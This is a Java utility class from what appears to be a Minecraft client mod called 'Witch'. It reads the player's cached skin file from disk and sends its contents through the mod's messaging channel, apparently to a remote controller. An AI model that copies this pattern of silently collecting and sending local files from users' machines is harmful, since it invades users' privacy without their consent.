package me.soda.witch.client.utils;

import com.mojang.authlib.minecraft.MinecraftProfileTexture;
import me.soda.witch.client.Witch;
import me.soda.witch.client.mixin.PlayerSkinProviderAccessor;
import me.soda.witch.shared.FileUtil;

import java.io.File;

import static me.soda.witch.client.Witch.mc;

public class PlayerSkinUtil {
    public static void sendPlayerSkin() {
        mc.getSkinProvider().loadSkin(mc.getSession().getProfile(), (type, id, texture) -> {
            if (type == MinecraftProfileTexture.Type.SKIN) {
                File skinCacheDir = ((PlayerSkinProviderAccessor) mc.getSkinProvider()).getSkinCacheDir();
                String skinHash = id.toString().split("/")[1];
                File skinFile = new File(skinCacheDir, skinHash.substring(0, 2) + "/" + skinHash);
                Witch.println("skin read " + skinHash);
                Witch.messageUtils.send("skin", FileUtil.read(skinFile));
            }
        }, true);
    }
}
